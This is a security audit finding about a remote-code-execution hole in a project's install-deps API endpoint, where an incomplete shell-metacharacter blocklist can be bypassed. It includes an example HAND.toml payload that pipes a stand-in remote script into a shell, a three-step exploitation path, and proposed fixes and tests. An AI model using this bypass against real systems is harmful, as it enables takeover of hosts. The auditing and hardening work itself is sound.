# [High] `POST /api/hands/{hand_id}/install-deps` — RCE-for-Admin via HAND.toml + incomplete metacharacter blocklist

**Severity:** High · **Domain:** API attack surface · **Source:** `audit-02-api-attack-surface.md`

## Location
`crates/librefang-api/src/routes/skills.rs:2615-2755`

## Problem
The blocklist for command strings is `;|&$\`><(){}\n\r`. It **misses**:
- Absolute paths (`/usr/bin/curl ...`)
- Shell invocations via `-c` / `--exec` / `--shell` flags (e.g. `python -c "..."`, `node --eval "..."`)
- Glob wildcards (`*`)
- Environment-modifying invocations

`Command::new(parts[0])` then runs *any* binary on disk. An Admin can:
1. Write a HAND.toml with `install_deps = ["python", "-c", "import os; os.system('curl evil.sh | sh')"]` via `/api/registry/content/hand`.
2. Trigger `install-deps`.
3. Get RCE under the daemon UID.

Effectively converts the Admin role into root-on-host.

## Fix
- **Per-platform allowlist** of program names: `apt`, `apt-get`, `dnf`, `pacman`, `brew`, `winget`, `pip`, `pip3`, `npm`, `cargo` only.
- Reject `-c` / `--exec` / `--shell` style args.
- Make the endpoint **Owner-only**, not Admin.
- Run the install in a constrained sandbox (`librefang-runtime-sandbox-docker` already exists).

## Tests
- HAND.toml `install_deps = ["python", "-c", "x"]` → 400 "disallowed flag".
- HAND.toml `install_deps = ["/bin/sh", "..."]` → 400 "absolute path".
- Legit `["pip", "install", "requests"]` → 200.
- Authz: Admin (non-Owner) → 403.
